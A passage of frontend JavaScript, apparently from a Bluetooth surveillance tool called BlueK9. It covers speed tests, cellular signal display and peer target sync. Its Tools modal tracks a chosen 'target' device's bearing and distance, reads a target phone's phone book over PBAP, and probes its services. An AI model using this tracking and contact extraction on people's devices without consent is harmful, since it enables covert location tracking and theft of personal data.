        peers.forEach(peer => {
            const option = document.createElement('option');
            option.value = peer.ip;
            option.dataset.name = peer.name;
            const icon = peer.type === 'bluek9' ? '🔷' : '🌐';
            option.textContent = `${icon} ${truncateHostname(peer.name)} (${peer.ip})`;
            select.appendChild(option);
        });
    } catch (e) {
        console.error('Failed to refresh settings speedtest peers:', e);
    }
}

/**
 * Start speed test from settings tab
 */
function startSpeedTestFromSettings() {
    const select = document.getElementById('settingsSpeedtestPeer');
    const targetIp = select?.value;
    const targetName = select?.selectedOptions[0]?.dataset.name || targetIp;

    if (!targetIp) {
        addLog('Please select a target node for speed test', 'WARNING');
        return;
    }

    // Use the existing speed test function
    fetch('/api/network/speedtest/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            target_ip: targetIp,
            target_name: targetName,
            duration: 10
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.error) {
            addLog(`Speed test failed: ${data.error}`, 'ERROR');
            return;
        }

        // Show live display
        const liveEl = document.getElementById('settingsSpeedtestLive');
        const resultsEl = document.getElementById('settingsSpeedtestResults');
        const startBtn = document.getElementById('settingsSpeedtestStart');
        const stopBtn = document.getElementById('settingsSpeedtestStop');

        if (liveEl) liveEl.classList.remove('hidden');
        if (resultsEl) resultsEl.classList.add('hidden');
        if (startBtn) startBtn.classList.add('hidden');
        if (stopBtn) stopBtn.classList.remove('hidden');

        // Initialize chart if needed
        if (!settingsSpeedtestChart) {
            initSettingsSpeedtestChart();
        } else {
            settingsSpeedtestChart.data.labels = [];
            settingsSpeedtestChart.data.datasets[0].data = [];
            settingsSpeedtestChart.update();
        }
    })
    .catch(e => addLog(`Speed test error: ${e.message}`, 'ERROR'));
}

/**
 * Initialize speed test chart in settings
 */
function initSettingsSpeedtestChart() {
    const ctx = document.getElementById('settingsSpeedtestChart');
    if (!ctx) return;

    settingsSpeedtestChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Speed (Mbps)',
                data: [],
                borderColor: '#00ffff',
                backgroundColor: 'rgba(0, 255, 255, 0.1)',
                borderWidth: 3,
                pointRadius: 4,
                fill: true,
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            animation: { duration: 300 },
            plugins: { legend: { display: false } },
            scales: {
                x: { display: true, grid: { color: 'rgba(255,255,255,0.1)' }, ticks: { color: '#00ffff', font: { size: 9 } } },
                y: { display: true, beginAtZero: true, grid: { color: 'rgba(255,255,255,0.1)' }, ticks: { color: '#00ffff', font: { size: 9 } } }
            }
        }
    });
}

/**
 * Handle speed test updates for settings tab
 */
function handleSettingsSpeedtestUpdate(data) {
    const progressBar = document.getElementById('settingsSpeedtestProgress');
    const progressText = document.getElementById('settingsSpeedtestPercent');
    const speedEl = document.getElementById('settingsSpeedtestSpeed');

    switch (data.status) {
        case 'running':
            if (progressBar) progressBar.style.width = `${data.progress || 0}%`;
            if (progressText) progressText.textContent = `${data.progress || 0}%`;
            if (speedEl) speedEl.textContent = (data.bandwidth || 0).toFixed(2);

            if (settingsSpeedtestChart && data.results) {
                settingsSpeedtestChart.data.labels = data.results.map(r => `${r.time}s`);
                settingsSpeedtestChart.data.datasets[0].data = data.results.map(r => r.mbps);
                settingsSpeedtestChart.update('none');
            }
            break;

        case 'complete':
            // Show results
            const liveEl = document.getElementById('settingsSpeedtestLive');
            const resultsEl = document.getElementById('settingsSpeedtestResults');
            const startBtn = document.getElementById('settingsSpeedtestStart');
            const stopBtn = document.getElementById('settingsSpeedtestStop');

            if (liveEl) liveEl.classList.add('hidden');
            if (resultsEl) resultsEl.classList.remove('hidden');
            if (startBtn) startBtn.classList.remove('hidden');
            if (stopBtn) stopBtn.classList.add('hidden');

            if (data.final_result) {
                const upEl = document.getElementById('settingsResultUpload');
                const downEl = document.getElementById('settingsResultDownload');
                const retEl = document.getElementById('settingsResultRetransmits');

                if (upEl) upEl.textContent = `${data.final_result.upload_mbps} Mbps`;
                if (downEl) downEl.textContent = `${data.final_result.download_mbps} Mbps`;
                if (retEl) retEl.textContent = data.final_result.retransmits;
            }
            break;

        case 'error':
        case 'cancelled':
            const liveEl2 = document.getElementById('settingsSpeedtestLive');
            const startBtn2 = document.getElementById('settingsSpeedtestStart');
            const stopBtn2 = document.getElementById('settingsSpeedtestStop');

            if (liveEl2) liveEl2.classList.add('hidden');
            if (startBtn2) startBtn2.classList.remove('hidden');
            if (stopBtn2) stopBtn2.classList.add('hidden');
            break;
    }
}

// ==================== CELLULAR SIGNAL FUNCTIONS ====================

let cellularRunning = false;

/**
 * Start cellular signal monitoring
 */
function startCellularMonitor() {
    fetch('/api/cellular/monitor/start', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            cellularRunning = true;
            // Initial fetch
            updateCellularStatus();
        })
        .catch(e => console.log('Cellular monitor start failed:', e));
}

/**
 * Update cellular status display
 */
function updateCellularStatus() {
    fetch('/api/cellular/status')
        .then(r => r.json())
        .then(data => {
            updateCellularUI(data);
        })
        .catch(e => {
            // No modem - show no signal
            updateCellularUI({ bars: 0, technology: '--' });
        });
}

/**
 * Update cellular UI from data
 */
function updateCellularUI(data) {
    // Update signal bars
    const bars = document.querySelectorAll('.signal-bar');
    const barCount = data.bars || 0;

    bars.forEach((bar, index) => {
        const barNum = index + 1;
        bar.classList.remove('active', 'warning', 'danger');

        if (barNum <= barCount) {
            if (barCount <= 2) {
                bar.classList.add('danger');
            } else if (barCount <= 3) {
                bar.classList.add('warning');
            } else {
                bar.classList.add('active');
            }
        }
    });

    // Update technology label
    const techEl = document.getElementById('cellularTech');
    if (techEl) {
        let tech = data.technology || '--';
        // Simplify technology string
        if (tech.includes('lte')) tech = 'LTE';
        else if (tech.includes('5g')) tech = '5G';
        else if (tech.includes('umts') || tech.includes('hspa')) tech = '3G';
        else if (tech.includes('edge') || tech.includes('gprs')) tech = '2G';
        techEl.textContent = tech.substring(0, 4).toUpperCase();
    }

    // Update tooltip values
    const setTooltip = (id, value) => {
        const el = document.getElementById(id);
        if (el) el.textContent = value || '--';
    };

    setTooltip('cellularOperator', data.operator);
    setTooltip('cellularTechnology', data.technology);
    setTooltip('cellularQuality', data.quality ? `${data.quality}%` : '--');
    setTooltip('cellularRssi', data.rssi ? `${data.rssi} dBm` : '--');
    setTooltip('cellularPhone', data.phone_number);
    setTooltip('cellularImei', data.imei);
    setTooltip('cellularIccid', data.iccid);
    setTooltip('cellularState', data.state);
}

/**
 * Handle cellular update from WebSocket
 */
function handleCellularUpdate(data) {
    updateCellularUI(data);
}

// ==================== WEBSOCKET HANDLERS FOR NETWORK ====================

// Add WebSocket handlers for network events (called from initWebSocket)
function initNetworkWebSocket() {
    if (!socket) return;

    socket.on('warhammer_update', handleWarhammerUpdate);
    socket.on('peer_location_update', (data) => {
        peerLocations[data.system_id] = data;
        if (showPeerLocations) {
            updatePeerMarkers();
        }
    });
    socket.on('cellular_update', handleCellularUpdate);

    // Handle target updates from peers
    socket.on('targets_update', (targetsData) => {
        addLogEntry('Targets updated from peer', 'INFO');
        // Refresh the targets list
        loadTargets();
    });
}

/**
 * Manually sync targets with all BlueK9 peers
 */
function syncTargetsWithPeers() {
    addLogEntry('Syncing targets with peers...', 'INFO');
    fetch('/api/network/sync_targets', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'synced') {
                addLogEntry(`Target sync complete: sent to ${data.sent_to} peer(s), received ${data.received} new target(s)`, 'INFO');
                // Refresh targets list
                loadTargets();
            } else if (data.status === 'no_peers') {
                addLogEntry('Target sync: No BlueK9 peers connected', 'WARNING');
            } else {
                addLogEntry(`Target sync failed: ${data.message || data.error || 'Unknown error'}`, 'ERROR');
            }
        })
        .catch(e => addLogEntry(`Target sync failed: ${e}`, 'ERROR'));
}

// ==================== SPEED TEST ====================

let speedtestChart = null;
let speedtestRunning = false;

/**
 * Initialize speed test chart
 */
function initSpeedtestChart() {
    const ctx = document.getElementById('speedtestChart');
    if (!ctx) return;

    speedtestChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Speed (Mbps)',
                data: [],
                borderColor: '#00ffff',
                backgroundColor: 'rgba(0, 255, 255, 0.1)',
                borderWidth: 3,
                pointRadius: 4,
                pointBackgroundColor: '#00ffff',
                fill: true,
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            animation: {
                duration: 300
            },
            plugins: {
                legend: { display: false }
            },
            scales: {
                x: {
                    display: true,
                    grid: { color: 'rgba(255,255,255,0.1)' },
                    ticks: { color: '#00ffff', font: { size: 9 } }
                },
                y: {
                    display: true,
                    beginAtZero: true,
                    grid: { color: 'rgba(255,255,255,0.1)' },
                    ticks: {
                        color: '#00ffff',
                        font: { size: 10 },
                        callback: (v) => v + ' Mbps'
                    }
                }
            }
        }
    });
}

/**
 * Refresh the list of available peers for speed testing
 */
async function refreshSpeedtestPeers() {
    const select = document.getElementById('speedtestPeerSelect');
    if (!select) return;

    try {
        const response = await fetch('/api/network/speedtest/peers');
        if (!response.ok) return;

        const data = await response.json();
        const peers = data.peers || [];

        // Keep current selection if possible
        const currentValue = select.value;

        // Clear and rebuild options
        select.innerHTML = '<option value="">Select target node...</option>';

        peers.forEach(peer => {
            const option = document.createElement('option');
            option.value = peer.ip;
            option.dataset.name = peer.name;
            const typeIcon = peer.type === 'bluek9' ? '🔷' : '🌐';
            option.textContent = `${typeIcon} ${peer.name} (${peer.ip})`;
            select.appendChild(option);
        });

        // Restore selection if still available
        if (currentValue) {
            select.value = currentValue;
        }
    } catch (e) {
        console.error('Failed to refresh speedtest peers:', e);
    }
}

/**
 * Start a speed test
 */
async function startSpeedTest() {
    const select = document.getElementById('speedtestPeerSelect');
    const targetIp = select?.value;
    const targetName = select?.selectedOptions[0]?.dataset.name || targetIp;

    if (!targetIp) {
        addLog('Please select a target node for speed test', 'WARNING');
        return;
    }

    try {
        const response = await fetch('/api/network/speedtest/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target_ip: targetIp,
                target_name: targetName,
                duration: 10
            })
        });

        const data = await response.json();
        if (!response.ok) {
            addLog(`Speed test failed: ${data.error}`, 'ERROR');
            return;
        }

        // Show test display
        speedtestRunning = true;
        updateSpeedtestUI('running', targetName);

        // Initialize chart if needed
        if (!speedtestChart) {
            initSpeedtestChart();
        } else {
            // Clear previous data
            speedtestChart.data.labels = [];
            speedtestChart.data.datasets[0].data = [];
            speedtestChart.update();
        }

    } catch (e) {
        addLog(`Speed test error: ${e.message}`, 'ERROR');
    }
}

/**
 * Stop running speed test
 */
async function stopSpeedTest() {
    try {
        await fetch('/api/network/speedtest/stop', { method: 'POST' });
        updateSpeedtestUI('stopped');
    } catch (e) {
        console.error('Failed to stop speed test:', e);
    }
}

/**
 * Update speed test UI based on status
 * Note: Main UI elements may not exist, so all element access uses null checks
 */
function updateSpeedtestUI(status, targetName = '') {
    const badge = document.getElementById('speedtestBadge');
    const display = document.getElementById('speedtestDisplay');
    const results = document.getElementById('speedtestResults');
    const startBtn = document.getElementById('speedtestStartBtn');
    const stopBtn = document.getElementById('speedtestStopBtn');
    const targetNameEl = document.getElementById('speedtestTargetName');

    switch (status) {
        case 'running':
            if (badge) {
                badge.textContent = 'TESTING';
                badge.className = 'speedtest-badge running';
            }
            if (display) display.classList.remove('hidden');
            if (results) results.classList.add('hidden');
            if (startBtn) startBtn.classList.add('hidden');
            if (stopBtn) stopBtn.classList.remove('hidden');
            if (targetName && targetNameEl) targetNameEl.textContent = targetName;
            break;

        case 'complete':
            if (badge) {
                badge.textContent = 'COMPLETE';
                badge.className = 'speedtest-badge complete';
            }
            if (display) display.classList.add('hidden');
            if (results) results.classList.remove('hidden');
            if (startBtn) startBtn.classList.remove('hidden');
            if (stopBtn) stopBtn.classList.add('hidden');
            speedtestRunning = false;
            break;

        case 'error':
        case 'stopped':
        case 'cancelled':
            if (badge) {
                badge.textContent = status === 'error' ? 'ERROR' : 'READY';
                badge.className = 'speedtest-badge ' + (status === 'error' ? 'error' : '');
            }
            if (display) display.classList.add('hidden');
            if (startBtn) startBtn.classList.remove('hidden');
            if (stopBtn) stopBtn.classList.add('hidden');
            speedtestRunning = false;
            break;
    }
}

/**
 * Handle speed test WebSocket updates
 * Note: Main UI speedtest elements have been removed, only settings tab exists now
 */
function handleSpeedtestUpdate(data) {
    const progressBar = document.getElementById('speedtestProgressBar');
    const progressText = document.getElementById('speedtestProgressText');
    const liveSpeed = document.getElementById('speedtestLiveSpeed');

    switch (data.status) {
        case 'running':
            // Update progress (with null checks for elements that may not exist)
            if (progressBar) progressBar.style.width = `${data.progress || 0}%`;
            if (progressText) progressText.textContent = `${data.progress || 0}%`;
            if (liveSpeed) liveSpeed.textContent = (data.bandwidth || 0).toFixed(2);

            // Update chart if it exists
            if (speedtestChart && data.results) {
                speedtestChart.data.labels = data.results.map(r => `${r.time}s`);
                speedtestChart.data.datasets[0].data = data.results.map(r => r.mbps);
                speedtestChart.update('none');
            }
            break;

        case 'complete':
            updateSpeedtestUI('complete');
            if (data.final_result) {
                // Update result elements with null checks
                const uploadEl = document.getElementById('speedtestUpload');
                const downloadEl = document.getElementById('speedtestDownload');
                const retransmitsEl = document.getElementById('speedtestRetransmits');

                if (uploadEl) uploadEl.textContent = `${data.final_result.upload_mbps} Mbps`;
                if (downloadEl) downloadEl.textContent = `${data.final_result.download_mbps} Mbps`;
                if (retransmitsEl) retransmitsEl.textContent = data.final_result.retransmits;

                // Final chart update
                if (speedtestChart && data.results) {
                    speedtestChart.data.labels = data.results.map(r => `${r.time}s`);
                    speedtestChart.data.datasets[0].data = data.results.map(r => r.mbps);
                    speedtestChart.update();
                }
            }
            break;

        case 'error':
            updateSpeedtestUI('error');
            addLog(`Speed test error: ${data.error}`, 'ERROR');
            break;

        case 'cancelled':
            updateSpeedtestUI('cancelled');
            break;
    }

    // Update settings tab (this is the primary UI now)
    handleSettingsSpeedtestUpdate(data);
}

/**
 * Initialize speed test WebSocket handler
 */
function initSpeedtestWebSocket() {
    if (typeof socket !== 'undefined') {
        socket.on('speedtest_update', handleSpeedtestUpdate);
    }
}


// Extend the section states to include network section
const originalSaveSectionStates = typeof saveSectionStates === 'function' ? saveSectionStates : null;
function saveSectionStatesExtended() {
    const sections = ['sectionScan', 'sectionMap', 'sectionTracking', 'sectionTargets', 'sectionNetwork', 'surveySection', 'statsSection', 'logsSection'];
    const states = {};
    sections.forEach(id => {
        const section = document.getElementById(id);
        if (section) {
            states[id] = section.classList.contains('collapsed');
        }
    });
    localStorage.setItem('bluek9_section_states', JSON.stringify(states));
}

// Override saveSectionStates
saveSectionStates = saveSectionStatesExtended;

// Initialize network features when app loads
document.addEventListener('DOMContentLoaded', () => {
    // Initialize network WebSocket handlers after a short delay
    setTimeout(() => {
        initNetworkWebSocket();
        initSpeedtestWebSocket();
        // Auto-start network monitor if setting is enabled
        const autoConnect = localStorage.getItem('bluek9_network_autoconnect') !== 'false';
        if (autoConnect) {
            startNetworkMonitor();
        }
        // Initial cellular status check
        updateCellularStatus();
        // Refresh speedtest peers
        refreshSpeedtestPeers();
    }, 1000);
});

// ==================== TOOLS MODAL ====================

let toolsTrackingActive = false;
let toolsTrackingBd = null;
let toolsTrackingInterval = null;

/**
 * Open the Tools modal
 */
function openToolsModal() {
    document.getElementById('toolsModal').classList.remove('hidden');
    populateToolsTargetSelect();
}

/**
 * Close the Tools modal
 */
function closeToolsModal() {
    document.getElementById('toolsModal').classList.add('hidden');
    // Stop any active tracking when closing
    if (toolsTrackingActive) {
        stopToolsTracking();
    }
}

/**
 * Switch between tools tabs
 */
function showToolsTab(tabName) {
    // Hide all content
    document.querySelectorAll('.tools-content').forEach(el => {
        el.classList.remove('active');
    });

    // Deactivate all tabs
    document.querySelectorAll('.tools-tab').forEach(el => {
        el.classList.remove('active');
    });

    // Show selected content
    const contentId = `tools${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`;
    const contentEl = document.getElementById(contentId);
    if (contentEl) contentEl.classList.add('active');

    // Activate selected tab
    event.target.classList.add('active');
}

/**
 * Populate all target select dropdowns in tools
 */
function populateToolsTargetSelect() {
    // All target selects in the Tools modal
    const selectIds = [
        'toolsTrackTargetSelect',
        'pbapTargetSelect',
        'sdpTargetSelect',
        'analysisTargetSelect'
    ];

    selectIds.forEach(selectId => {
        const select = document.getElementById(selectId);
        if (!select) return;

        // Keep first option
        select.innerHTML = '<option value="">Select target...</option>';

        // Add targets first
        Object.keys(targets).forEach(bd => {
            const device = devices[bd] || {};
            const name = device.device_name || truncateHostname(bd);
            const option = document.createElement('option');
            option.value = bd;
            option.textContent = `[TARGET] ${name} (${bd})`;
            option.className = 'target-option';
            select.appendChild(option);
        });

        // Add other devices
        Object.keys(devices).forEach(bd => {
            if (targets[bd]) return; // Already added as target
            const device = devices[bd];
            const name = device.device_name || 'Unknown';
            const option = document.createElement('option');
            option.value = bd;
            option.textContent = `${name} (${bd})`;
            select.appendChild(option);
        });
    });
}

/**
 * Start target tracking from Tools modal
 */
function startToolsTracking() {
    const select = document.getElementById('toolsTrackTargetSelect');
    const bdAddress = select ? select.value : null;

    if (!bdAddress) {
        addLogEntry('Select a target device to track', 'WARNING');
        return;
    }

    toolsTrackingBd = bdAddress;
    toolsTrackingActive = true;

    // Update UI
    document.getElementById('toolsBtnStartTrack').disabled = true;
    document.getElementById('toolsBtnStopTrack').disabled = false;
    document.getElementById('toolsTrackingStatus').textContent = 'ACTIVE';
    document.getElementById('toolsTrackingStatus').style.color = 'var(--success)';

    // Start tracking via API
    fetch(`/api/device/${bdAddress}/geo/track`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started' || data.status === 'already_running') {
            addLogEntry(`Tools: Started tracking ${bdAddress}`, 'INFO');
            addOperation(`tools-track-${bdAddress}`, 'TRACK', 'Tools Tracking', {
                bdAddress,
                cancellable: true,
                cancelFn: () => stopToolsTracking()
            });
        }
    })
    .catch(e => {
        addLogEntry(`Tools tracking error: ${e}`, 'ERROR');
        stopToolsTracking();
    });
}

/**
 * Stop target tracking from Tools modal
 */
function stopToolsTracking() {
    if (toolsTrackingBd) {
        fetch(`/api/device/${toolsTrackingBd}/geo/stop`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }).catch(() => {});

        removeOperation(`tools-track-${toolsTrackingBd}`);
    }

    toolsTrackingActive = false;
    toolsTrackingBd = null;

    // Update UI
    document.getElementById('toolsBtnStartTrack').disabled = false;
    document.getElementById('toolsBtnStopTrack').disabled = true;
    document.getElementById('toolsTrackingStatus').textContent = 'IDLE';
    document.getElementById('toolsTrackingStatus').style.color = '';
    document.getElementById('toolsTrackingRssi').textContent = '--';
    document.getElementById('toolsTrackingBearing').textContent = '--';
    document.getElementById('toolsTrackingDistance').textContent = '--';
    document.getElementById('toolsCompassRssi').textContent = '--';
}

/**
 * Update Tools tracking display with device or geo ping data
 */
function updateToolsTrackingDisplay(data) {
    if (!toolsTrackingActive) return;

    // Get RSSI from device data
    const rssi = data.rssi || '--';
    const rssiEl = document.getElementById('toolsTrackingRssi');
    const compassRssiEl = document.getElementById('toolsCompassRssi');

    if (rssiEl) {
        rssiEl.textContent = rssi !== '--' ? `${rssi} dBm` : '--';
        // Color code RSSI
        if (rssi !== '--') {
            const rssiNum = parseInt(rssi);
            if (rssiNum >= -50) {
                rssiEl.style.color = 'var(--success)';
            } else if (rssiNum >= -70) {
                rssiEl.style.color = 'var(--warning)';
            } else {
                rssiEl.style.color = 'var(--danger)';
            }
        }
    }
    if (compassRssiEl) compassRssiEl.textContent = rssi;

    // Update bearing if available (from geo ping data)
    if (data.direction) {
        const bearingEl = document.getElementById('toolsTrackingBearing');
        const arrow = document.getElementById('toolsCompassArrow');

        if (data.direction.bearing !== null && data.direction.bearing !== undefined) {
            const cardinalDir = getCardinalDirection(data.direction.bearing);
            bearingEl.textContent = `${Math.round(data.direction.bearing)}° ${cardinalDir}`;

            // Rotate compass arrow
            if (arrow) {
                arrow.style.transform = `translate(-50%, -100%) rotate(${data.direction.bearing}deg)`;
            }
        } else {
            bearingEl.textContent = data.direction.message || 'Move to find';
        }

        // Show trend indicator
        if (data.direction.trend) {
            const statusEl = document.getElementById('toolsTrackingStatus');
            if (statusEl) {
                if (data.direction.trend === 'closer') {
                    statusEl.textContent = 'GETTING CLOSER';
                    statusEl.style.color = 'var(--success)';
                } else if (data.direction.trend === 'farther') {
                    statusEl.textContent = 'MOVING AWAY';
                    statusEl.style.color = 'var(--danger)';
                } else if (data.direction.trend === 'stable') {
                    statusEl.textContent = 'SIGNAL STABLE';
                    statusEl.style.color = 'var(--warning)';
                }
            }
        }
    }

    // Update distance estimate from emitter location if available
    if (data.distance_estimate) {
        document.getElementById('toolsTrackingDistance').textContent = `~${data.distance_estimate}m`;
    } else if (data.emitter_accuracy) {
        // Use CEP radius as rough distance estimate
        document.getElementById('toolsTrackingDistance').textContent = `CEP: ${data.emitter_accuracy}m`;
    }

    // Update last seen timestamp
    if (data.last_seen) {
        const lastSeen = new Date(data.last_seen);
        const now = new Date();
        const diffSec = Math.floor((now - lastSeen) / 1000);
        const statusEl = document.getElementById('toolsTrackingStatus');
        if (statusEl && diffSec <= 5) {
            statusEl.textContent = 'ACTIVE';
            statusEl.style.color = 'var(--success)';
        } else if (diffSec <= 30) {
            statusEl.textContent = 'STALE';
            statusEl.style.color = 'var(--warning)';
        }
    }
}

/**
 * Read phone book via PBAP
 */
function readPhoneBook() {
    const select = document.getElementById('pbapTargetSelect');
    const bdAddress = select ? select.value : '';
    const bookType = document.getElementById('pbapBookType').value;

    if (!bdAddress) {
        addLogEntry('Select a target device for PBAP', 'WARNING');
        return;
    }

    addLogEntry(`PBAP: Reading ${bookType} from ${bdAddress}...`, 'INFO');

    // Show loading state
    const resultsList = document.getElementById('pbapResultsList');
    const resultsDiv = document.getElementById('pbapResults');
    resultsDiv.classList.remove('hidden');
    resultsList.innerHTML = '<div class="loading-text">Attempting PBAP connection...</div>';

    fetch(`/api/tools/pbap/${bdAddress}/${bookType}`)
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success' && data.entries) {
                resultsList.innerHTML = '';
                if (data.entries.length === 0) {
                    resultsList.innerHTML = '<div class="no-results">No entries found</div>';
                } else {
                    data.entries.forEach(entry => {
                        const item = document.createElement('div');
                        item.className = 'pbap-entry';
                        item.innerHTML = `
                            <span class="pbap-name">${entry.name || 'Unknown'}</span>
                            <span class="pbap-number">${entry.number || entry.tel || ''}</span>
                        `;
                        resultsList.appendChild(item);
                    });
                }
                addLogEntry(`PBAP: Retrieved ${data.entries.length} entries`, 'INFO');
            } else {
                resultsList.innerHTML = `<div class="error-text">${data.error || 'PBAP access failed'}</div>`;
                addLogEntry(`PBAP failed: ${data.error || 'Unknown error'}`, 'ERROR');
            }
        })
        .catch(e => {
            resultsList.innerHTML = `<div class="error-text">Connection failed: ${e}</div>`;
            addLogEntry(`PBAP error: ${e}`, 'ERROR');
        });
}

/**
 * Discover services via SDP
 */
function discoverServices() {
    const select = document.getElementById('sdpTargetSelect');
    const bdAddress = select ? select.value : '';

    if (!bdAddress) {
        addLogEntry('Select a target device for SDP discovery', 'WARNING');
        return;
    }

    addLogEntry(`SDP: Discovering services on ${bdAddress}...`, 'INFO');

    // Show loading state
    const resultsList = document.getElementById('sdpResultsList');
    const resultsDiv = document.getElementById('sdpResults');
    resultsDiv.classList.remove('hidden');
    resultsList.innerHTML = '<div class="loading-text">Running SDP browse...</div>';

    fetch(`/api/tools/sdp/${bdAddress}`)
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success' && data.services) {
                resultsList.innerHTML = '';
                if (data.services.length === 0) {
                    resultsList.innerHTML = '<div class="no-results">No services discovered</div>';
                } else {
                    data.services.forEach(svc => {
                        const item = document.createElement('div');
                        item.className = 'sdp-service';
                        item.innerHTML = `
                            <div class="sdp-service-name">${svc.name || 'Unknown Service'}</div>
                            <div class="sdp-service-details">
                                ${svc.protocol ? `<span>Protocol: ${svc.protocol}</span>` : ''}
                                ${svc.channel ? `<span>Channel: ${svc.channel}</span>` : ''}
                                ${svc.uuid ? `<span class="sdp-uuid">UUID: ${svc.uuid}</span>` : ''}
                            </div>
                        `;
                        resultsList.appendChild(item);
                    });
                }
                addLogEntry(`SDP: Found ${data.services.length} services`, 'INFO');
            } else {
                resultsList.innerHTML = `<div class="error-text">${data.error || 'SDP browse failed'}</div>`;
                addLogEntry(`SDP failed: ${data.error || 'Unknown error'}`, 'ERROR');
            }
        })
        .catch(e => {
            resultsList.innerHTML = `<div class="error-text">Connection failed: ${e}</div>`;
            addLogEntry(`SDP error: ${e}`, 'ERROR');
        });
}

/**
 * Run comprehensive device analysis
 */
function runDeviceAnalysis() {
    const select = document.getElementById('analysisTargetSelect');
    const bdAddress = select ? select.value : '';
    const doOui = document.getElementById('analysisOuiLookup').checked;
    const doClass = document.getElementById('analysisDeviceClass').checked;
    const doServices = document.getElementById('analysisServiceScan').checked;

    if (!bdAddress) {
        addLogEntry('Select a target device for analysis', 'WARNING');
        return;
    }

    addLogEntry(`Analysis: Running deep analysis on ${bdAddress}...`, 'INFO');

    // Show loading state
    const resultsContent = document.getElementById('analysisResultsContent');
    const resultsDiv = document.getElementById('analysisResults');
    resultsDiv.classList.remove('hidden');
    resultsContent.innerHTML = '<div class="loading-text">Analyzing device...</div>';

    fetch(`/api/tools/analyze/${bdAddress}?oui=${doOui}&class=${doClass}&services=${doServices}`)
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success') {
                let html = '<div class="analysis-report">';

                // OUI/Manufacturer info
                if (data.oui) {
                    html += `
                        <div class="analysis-section">
                            <div class="analysis-section-title">Manufacturer (OUI)</div>
                            <div class="analysis-item"><strong>Company:</strong> ${data.oui.company || 'Unknown'}</div>
                            <div class="analysis-item"><strong>Prefix:</strong> ${data.oui.prefix || bdAddress.substring(0, 8)}</div>
                            ${data.oui.country ? `<div class="analysis-item"><strong>Country:</strong> ${data.oui.country}</div>` : ''}
                        </div>
                    `;
                }

                // Device class info
                if (data.device_class) {
                    html += `
                        <div class="analysis-section">
                            <div class="analysis-section-title">Device Classification</div>
                            <div class="analysis-item"><strong>Major Class:</strong> ${data.device_class.major || 'Unknown'}</div>
                            <div class="analysis-item"><strong>Minor Class:</strong> ${data.device_class.minor || 'Unknown'}</div>
                            <div class="analysis-item"><strong>Services:</strong> ${data.device_class.services ? data.device_class.services.join(', ') : 'None'}</div>
                        </div>
                    `;
                }

                // Services
                if (data.services && data.services.length > 0) {
                    html += `
                        <div class="analysis-section">
                            <div class="analysis-section-title">Services (${data.services.length})</div>
                            ${data.services.map(svc => `<div class="analysis-item">• ${svc.name || svc}</div>`).join('')}
                        </div>
                    `;
                }

                // Risk assessment
                if (data.risk) {
                    const riskColor = data.risk.level === 'high' ? 'var(--danger)' :
                                     data.risk.level === 'medium' ? 'var(--warning)' : 'var(--success)';
                    html += `
                        <div class="analysis-section">
                            <div class="analysis-section-title">Risk Assessment</div>
                            <div class="analysis-item"><strong>Level:</strong> <span style="color:${riskColor}">${data.risk.level.toUpperCase()}</span></div>
                            ${data.risk.notes ? data.risk.notes.map(n => `<div class="analysis-item">• ${n}</div>`).join('') : ''}
                        </div>
                    `;
                }

                html += '</div>';
                resultsContent.innerHTML = html;
                addLogEntry(`Analysis complete for ${bdAddress}`, 'INFO');
            } else {
                resultsContent.innerHTML = `<div class="error-text">${data.error || 'Analysis failed'}</div>`;
                addLogEntry(`Analysis failed: ${data.error || 'Unknown error'}`, 'ERROR');
            }
        })
        .catch(e => {
            resultsContent.innerHTML = `<div class="error-text">Analysis failed: ${e}</div>`;
            addLogEntry(`Analysis error: ${e}`, 'ERROR');
        });
}

// Hook into geo ping handler to update Tools tracking display
const originalHandleGeoPing = handleGeoPing;
handleGeoPing = function(data) {
    originalHandleGeoPing(data);
    updateToolsTrackingDisplay(data);
};

// ==================== PICONET ANALYSIS MODAL ====================

let piconetSimulation = null;

/**
 * Open the Piconet Analysis modal
 */
function openPiconetModal() {
    document.getElementById('piconetModal').classList.remove('hidden');
    refreshPiconetGraph();
}

/**
 * Close the Piconet Analysis modal
 */
function closePiconetModal() {
    document.getElementById('piconetModal').classList.add('hidden');
    if (piconetSimulation) {
        piconetSimulation.stop();
    }
}

/**
 * Refresh and render the piconet graph
 */
function refreshPiconetGraph() {
    fetch('/api/piconets')
        .then(response => response.json())
        .then(result => {
            if (result.status === 'success') {
                renderPiconetGraph(result.data);
            } else {
                addLogEntry('Failed to load piconet data: ' + (result.error || 'Unknown error'), 'ERROR');
            }
        })
        .catch(error => {
            addLogEntry('Piconet analysis error: ' + error, 'ERROR');
        });
}

/**
 * Render the force-directed piconet graph using D3.js
 */
function renderPiconetGraph(data) {
    const container = document.getElementById('piconetGraphContainer');
    const svg = d3.select('#piconetGraph');

    // Clear existing graph
    svg.selectAll('*').remove();

    // Update stats
    document.getElementById('piconetNodeCount').textContent = data.nodes.length;
    document.getElementById('piconetEdgeCount').textContent = data.edges.length;

    if (data.nodes.length === 0) {
        svg.append('text')
            .attr('x', container.clientWidth / 2)
            .attr('y', container.clientHeight / 2)
            .attr('text-anchor', 'middle')
            .attr('fill', '#484f58')
            .style('font-family', 'Share Tech Mono, monospace')
            .style('font-size', '12px')
            .text('No devices detected. Start scanning to see relationships.');
        return;
    }

    const width = container.clientWidth;
    const height = container.clientHeight;

    svg.attr('viewBox', [0, 0, width, height]);

    // Color scale based on role
    const roleColors = {
        'master': '#00d4ff',
        'slave': '#30d158',
        'dual': '#ffb000',
        'unknown': '#8b949e'
    };

    // Create links
    const links = data.edges.map(d => ({
